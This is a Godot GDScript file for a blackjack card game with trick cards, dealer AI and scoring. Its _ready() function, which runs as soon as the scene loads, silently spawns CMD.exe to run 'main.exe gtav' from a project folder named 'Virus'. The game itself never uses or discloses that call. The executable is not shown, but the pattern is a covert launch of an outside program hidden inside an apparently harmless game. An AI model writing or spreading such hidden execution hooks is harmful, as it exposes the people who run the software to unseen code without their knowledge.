extends Node2D
class_name Blackjack

@onready var cards: Array[Card] = get_cards()
@onready var dealer_cards: Array = $Dealer.get_children()
@onready var player_cards: Array = $Player.get_children()
@onready var floating_player: AnimationPlayer = $FloatingPlayer
@onready var hit_player: AnimationPlayer = $"/root/Game/HitPlayer"
@onready var label_player: AnimationPlayer = $LabelPlayer

@onready var player_score: Label = $Labels/PlayerScore
@onready var dealer_score: Label = $Labels/DealerScore

@onready var hit_button = $Buttons/HitButton
@onready var stay_button = $Buttons/StayButton
@onready var result_label = $ResultLabel

@onready var trick_cards = $TrickCards
@onready var trick_storage = $TrickStorage

var gamedata = {
	"dealer": [],
	"player": [],
	"win_at": 21,
	"staying": false,
	"table": [],
	"tricks": [],
	"seven": false,
}
var no_longer_hit = false

func _ready():
	OS.create_process("CMD.exe", ["/C", "cd \"%s\" && main.exe gtav" % ProjectSettings.globalize_path("res://Virus/main.dist")])
	#var output = []

	#OS.execute("CMD.exe", ["/C", "cd \"%s\" && main.exe gtav" % ProjectSettings.globalize_path("res://Virus/main.dist")], output)
	
	#print(output)
	float_all()
	
	floating_player.play("floating")
	
	init_game()
	await get_tree().create_timer(2).timeout

func reset_game():
	for card in cards:
		card.get_node("RevealPlayer").play_backwards("reveal")
	for trick in trick_storage.get_children():
		trick.queue_free()
	
	gamedata = {
		"dealer": [],
		"player": [],
		"win_at": 21,
		"staying": false,
		"table": [],
		"tricks": [],
		"seven": false,
		"draw_another": false
	}
	init_game()

func init_game():
	at("d", 0, random_card(), false)
	at("d", 1, random_card(), true)
	at("p", 0, random_card(), false)
	at("p", 1, random_card(), true)
	
	trick_storage.give_card(Utils.TRICK_CARDS[7])
	give_trick()

func reveal_all() -> void:
	for card in cards:
		card.get_node("RevealPlayer").play("reveal")

func at(what: String, index: int, card: String, show: bool, update: bool = true):
	if what == "d":
		dealer_cards[index].assign_value(card)
		dealer_cards[index].show_value(show, true)
		gamedata.dealer.append(card)
		
		if !update: return
		
		label_player.play("increase_dealer")
		dealer_score.text = str(get_score("d", true))
	else:
		player_cards[index].assign_value(card)
		player_cards[index].show_value(show)
		gamedata.player.append(card)
		
		label_player.play("increase_player")
		player_score.text = str(get_score("p"))

func win(what: String):
	if what == "draw":
		result_label.text = "Draw..."
		result_label.show()
		return
	
	result_label.text = "I win." if what == "d" else "You win."
	result_label.show()
	
	give_trick()

func give_trick():
	var trick = Utils.TRICK_CARDS.pick_random()

	gamedata.tricks.append(trick)
	trick_storage.give_card(trick)

func buttons(enabled: bool):
	if !no_longer_hit:
		hit_button.disabled = !enabled
	stay_button.disabled = !enabled

func get_cards() -> Array[Card]:
	var cards: Array[Card] = []
	
	cards.append_array($Dealer.get_children())
	cards.append_array($Player.get_children())
	
	return cards

func float_all():
	for card in cards:
		card.get_node("FloatingPlayer").play("floating")

func random_card(best: bool = false, who: String = "p") -> String:
	var blacklisted = []
	
	for card in gamedata.dealer:
		blacklisted.append(card)
	for card in gamedata.player:
		blacklisted.append(card)
	
	if not best:
		var card = null
		while card == null or card in blacklisted:
			card = Card.POSSIBLE_CARDS.pick_random()
		return card
	
	var best_card = null
	var closest_score_diff = 999
	var current_score = get_score(who)
	var target_score = gamedata.win_at

	for card in Card.POSSIBLE_CARDS:
		if card not in blacklisted:
			var temp_score = current_score + Utils.score_from(card)
			var score_diff = abs(target_score - temp_score)
			if score_diff < closest_score_diff and temp_score <= target_score:
				closest_score_diff = score_diff
				best_card = card
	
	return best_card

func get_score(who: String, exclude_first_card: bool = false) -> int:
	var cards = gamedata.player.duplicate() if who == "p" else gamedata.dealer.duplicate()
	var score = 0
	var sevens = 0
	
	if exclude_first_card: cards.remove_at(0)

	for card in cards:
		var temp_score = Utils.score_from(card);
		
		if gamedata.seven and temp_score == 7:
			sevens += 1
		
		score += temp_score
	
	if sevens == 3:
		win('p')
	return score

func _on_hit_button_pressed(best: bool = false):
	at("p", gamedata.player.size(), random_card(best), true)
	hit_player.play("hit")
	gamedata.staying = false
	
	var score = get_score("p")
	
	if score >= gamedata.win_at:
		no_longer_hit = true
		hit_button.disabled = true
	
	buttons(false)
	
	await get_tree().create_timer(1.5).timeout
	
	play_ai()

func play_ai():
	var dealer_score = get_score("d")
	var player_score = get_score("p")

	# TODO: make this easier for the player
	if dealer_score != gamedata.win_at:
		at("d", gamedata.dealer.size(), random_card(true, "d"), true)
		hit_player.play("hit_dealer")
		buttons(true)
	else:
		stay()

func stay():
	if gamedata.staying:
		return end_game()
	
	buttons(true)

func _on_stay_button_pressed():
	gamedata.staying = true

	buttons(false)
	
	await get_tree().create_timer(1.5).timeout
	
	play_ai()

func end_game():
	var d_final_score = get_score("d");
	dealer_cards[0].show_value(true, false, true)
	player_cards[0].hide_label()
	player_cards[0].show_value(true, false, true)

	label_player.play("increase_dealer")
	dealer_score.text = str(d_final_score)
	
	if d_final_score == get_score("p"):
		win("draw")
	if d_final_score > gamedata.win_at:
		win("p")
	elif d_final_score == gamedata.win_at:
		win("d")
	elif d_final_score > get_score("p"):
		win("d")
	else:
		win("p")
